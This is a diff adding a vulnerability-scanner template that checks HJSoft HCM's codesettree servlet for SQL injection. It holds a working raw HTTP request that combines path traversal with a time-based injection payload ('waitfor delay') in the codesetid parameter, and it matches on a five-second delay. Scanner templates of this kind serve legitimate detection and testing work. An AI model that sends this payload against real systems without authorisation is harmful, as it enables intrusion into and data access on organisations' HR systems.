@@ -1,0 +1,31 @@
+id: hjsoft-hcm-codesettree-sqli
+
+info:
+  name: HJSoft HCM codesettree - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    Hongjing HCM codesettree is affected by SQL injection.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFOA/%E5%AE%8F%E6%99%AFHCM-codesettree%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: HJSoft-HCM
+
+http:
+  - raw:
+      - |
+        GET /templates/attestation/../../servlet/codesettree?flag=3&codesetid=111';waitfor+delay+'0:0:5'--+&parentid=-1&fromflag=" HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=5"
+      - type: word
+        words:
+          - "TreeNode"
+          - 'text="root"'
+        condition: and
+      - type: status
+        status:
+          - 200
